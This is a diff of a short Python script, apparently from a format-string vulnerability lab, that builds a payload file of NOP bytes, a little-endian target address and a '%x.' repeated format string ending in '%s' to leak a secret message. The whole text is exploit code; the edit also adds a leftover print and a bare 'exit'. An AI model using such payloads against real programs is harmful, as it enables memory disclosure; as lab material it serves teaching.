@@ -9,17 +9,20 @@ N = 1500
 # Fill the content with NOP's
 content = bytearray(0x90 for i in range(N))
 
-# Address of the secret message
-# secret_msg_addr = 0x080af014
-secret_msg_addr = 0xffffc920
-content[0:4]  =  (secret_msg_addr).to_bytes(4,byteorder='little')
-
-s = "%.x" * 70 + "%s\n"
-fmt = s.encode('latin-1')
-
 offset=4
 
-# Store the format string in the payload
+# Address of the secret message
+secret_msg_addr = 0x080af014
+content[0:offset]  =  (secret_msg_addr).to_bytes(4,byteorder='little')
+print(content[0:4])
+exit
+
+# This line shows how to construct a string s with
+s = "%x." * 65 + "%s"
+fmt = s.encode('latin-1')
+
+# The line shows how to store the string s at offset 4
+fmt  = (s).encode('latin-1')
 content[offset:offset+len(fmt)] = fmt
 
 # Write payload to badfile
